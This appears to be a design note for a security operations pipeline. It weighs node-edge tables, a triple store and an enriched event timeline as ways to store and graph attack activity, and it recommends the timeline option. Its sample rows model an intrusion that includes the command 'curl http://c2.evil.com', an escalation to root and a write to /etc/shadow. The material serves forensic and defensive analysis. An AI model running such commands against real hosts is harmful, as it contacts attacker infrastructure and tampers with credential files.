What graph data model for the activity timeline?

The output format determines what visualizations are possible. All options use Delta tables.

A

Node + Edge Tables (Graph-Native)

Two Delta tables: gold.timeline_nodes and gold.timeline_edges

-- NODES (entities)
node_id, node_type, label, properties
("user:ubuntu", "user", "ubuntu", {os: "Linux"})
("host:ip-10-0-1-50", "host", "ip-10-0-1-50", {os: "Linux", ip: "10.0.1.50"})
("ip:185.220.101.1", "malicious_ip", "185.220.101.1", {feed: "ipsum", threat: "reputation"})
("proc:curl", "process", "curl http://c2.evil.com", {})
("user:root", "user", "root", {escalated: true})
-- EDGES (actions/relationships)
edge_id, src_node_id, dst_node_id, action, time, properties
("ip:185.220.101.1" → "host:ip-10-0-1-50", "ssh_login", 10:01, {user: "ubuntu", status: "success"})
("user:ubuntu" → "proc:curl", "executed", 10:03, {source: "bash_history"})
("user:ubuntu" → "user:root", "privilege_escalation", 10:05, {method: "sudo"})

Pros

  • Native format for D3.js, vis.js, Cytoscape, GraphFrames
  • Supports force-directed, hierarchical, and temporal layouts
  • Easy to traverse: "show all edges from this node"
  • Natural fit for attack path visualization

Cons

  • Two tables to manage and join
  • Requires entity resolution (same user = same node)
B

Triple Store (Subject-Action-Object)

Single Delta table: gold.activity_triples

-- TRIPLES (one table)
triple_id, subject, subject_type, action, object, object_type, time, properties
("185.220.101.1", "ip", "ssh_login", "ip-10-0-1-50", "host", 10:01, {user: "ubuntu"})
("ubuntu", "user", "executed", "curl http://c2.evil.com", "command", 10:03, {})
("ubuntu", "user", "escalated_to", "root", "user", 10:05, {method: "sudo"})
("root", "user", "modified", "/etc/shadow", "file", 10:06, {syscall: "open"})

Pros

  • Single table — simpler to write and query
  • Easily converted to node+edge for visualization
  • Natural SQL: WHERE subject='ubuntu' ORDER BY time
  • RDF/knowledge-graph compatible if needed later

Cons

  • Node properties duplicated across rows
  • Needs a transform step before graph visualization
C

Enriched Timeline + Graph View

One ordered event table + a notebook/view that derives graph on demand

-- TIMELINE (ordered events)
event_id, time, hostname, user, event_type, action, detail, source_table, raw_event
(10:01, "ip-10-0-1-50", "ubuntu", "auth", "ssh_login", "from 185.220.101.1", "host_auth", ...)
(10:03, "ip-10-0-1-50", "ubuntu", "command", "executed", "curl http://c2.evil.com", "host_commands", ...)
(10:05, "ip-10-0-1-50", "root", "auth", "privilege_escalation", "sudo by ubuntu", "host_auth", ...)
(10:06, "ip-10-0-1-50", "root", "file_access", "write", "/etc/shadow", "host_auditd", ...)
-- GRAPH derived on demand via notebook/view
Extract unique entities as nodes, sequential events as edges
nodes = DISTINCT(users, hosts, IPs, processes, files)
edges = each event becomes src_entity → dst_entity

Pros

  • Timeline table is useful standalone (chronological triage)
  • Graph is derived, not stored — always consistent
  • Simplest to build: just UNION + ORDER BY across silver tables
  • Supports both timeline AND graph views from one source

Cons

  • Graph derivation has latency (computed per query)
  • Entity extraction logic lives in a view, not pre-materialized

Visual: What the graph looks like

Regardless of storage format, the rendered graph shows the attack path

185.220.101.1 —ssh_login→ ip-10-0-1-50
ubuntu —executed→ curl http://c2.evil.com
ubuntu —sudo→ root —modified→ /etc/shadow

My recommendation: Option C — build the timeline table first (immediately useful for triage), derive graph on demand. You get both views from one source of truth, and the timeline is the simpler starting point that naturally evolves into graph.
